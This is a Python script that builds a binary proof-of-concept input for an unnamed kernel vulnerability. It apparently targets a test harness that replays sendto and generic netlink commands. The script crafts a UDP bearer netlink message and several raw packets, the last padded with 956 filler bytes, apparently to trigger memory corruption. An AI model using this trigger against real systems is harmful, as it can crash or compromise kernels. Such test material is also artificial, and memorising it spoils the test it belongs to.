'''
Blob generator for Vulnerability XXX
'''
import struct

NETLINK_GENERIC	= 16

COMMAND_SENDTO 	= 0
COMMAND_NETLINK 	= 1

## The format for the harness is as follows:
'''

4 bytes to indicate the number of commands
[4-bytes command count]

Next there MUST be command count commands. Currently there are two commands: 
 *  0 - sendto() a packet blob
 *      [0x0][4-bytes size][4-bytes send flags][size-bytes packet data]
 *  1 - send netlink packet
        [0x1][4-bytes Message Type][4-bytes Message Flags][4-bytes Netlink Protocol][4-bytes size][size bytes data]
'''


## Create a sendto command
def compose_sendto_call( flags, pkt_data ):
	data = b''

	data += struct.pack('I', COMMAND_SENDTO)
	data += struct.pack('I', len(pkt_data))
	data += struct.pack('I', flags)
	data += pkt_data

	return data

## Expects a list of blobs
def compose_blob_with_count(cmds):
	data = b''

	data += struct.pack('I', len(cmds))

	for x in cmds:
		data += x

	return data

## Builds a blob for a network packet
def compose_raw_socket_blob(cmds):
	data = b''

	data += compose_blob_with_count(cmds)

	return data

## Builds the blob for a single call to netlink
def compose_netlink_call( nl_msgtype, nl_msgflags, nl_prot, pkt_data):
	data = b''

	data += struct.pack('I', COMMAND_NETLINK)
	data += struct.pack('I', nl_msgtype)
	data += struct.pack('I', nl_msgflags)
	data += struct.pack('I', nl_prot)
	data += struct.pack('I', len(pkt_data))
	data += pkt_data

	return data

if __name__ == '__main__':
	## Compose the blob here
	cmds = []

	packet = b"\x03\x01\x00\x00\x40\x00\x01\x80\x0d\x00\x01\x00\x75\x64\x70\x3a\x55\x44\x50\x31"
	packet += b"\x00\x00\x00\x00\x2c\x00\x04\x80\x14\x00\x01\x00\x02\x00\x17\xe6\x7f\x00\x00\x01"
	packet += b"\x00\x00\x00\x00\x00\x00\x00\x00\x14\x00\x02\x00\x02\x00\x17\xe6\xe4\x00\x12\x67"
	packet += b"\x00\x00\x00\x00\x00\x00\x00\x00"
	cmds.append( compose_netlink_call(0x1d, 5, NETLINK_GENERIC, packet) )

	packet = b"\x5a\xd0\x00\x18\x00\x00\x00\x00\x00\x00\x00\x00\x11\x22\x33\x44\x00\x00\x12\x67\x00\x00\x00\x03"
	cmds.append( compose_sendto_call(0, packet) )

	packet = b"\x4f\x40\x00\x38\x20\x00\x00\x00\x00\x00\x80\x00\x11\x22\x33\x44\x00\x00\x00\x01\xc4"
	packet += b"\xd4\x00\x00\x11\x22\x33\x44\x7f\x00\x00\x01\x00\x00\x00\x00\x0d\xac\x00\x00\x55\x44"
	packet += b"\x50\x31\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	cmds.append( compose_sendto_call(0, packet) )

	packet = b"\x4f\x40\x00\x2c\x00\x00\x00\x00\x00\x00\x00\x01\x11\x22\x33\x44\x00\x00\x00\x01"
	packet += b"\xc4\xd4\x00\x00\x11\x22\x33\x44\x7f\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00"
	packet += b"\x00\x00\x00\x00"
	cmds.append( compose_sendto_call(0, packet) )

	packet = b"\x5c\xc0\x03\xf8\x00\x00\x00\x00\x00\x00\x00\x01\x11\x22\x33\x44\x00\x00\x00\x00"
	packet += b"\x00\x00\x00\x00\x48\x41\x58\x58\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	packet += b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\xc4"
	packet += b"\x43"*956

	cmds.append( compose_sendto_call(0, packet) )

	blob = compose_raw_socket_blob( cmds )

	## Write out the blob
	f = open('blob.bin', 'wb')
	f.write(blob)
	f.close()
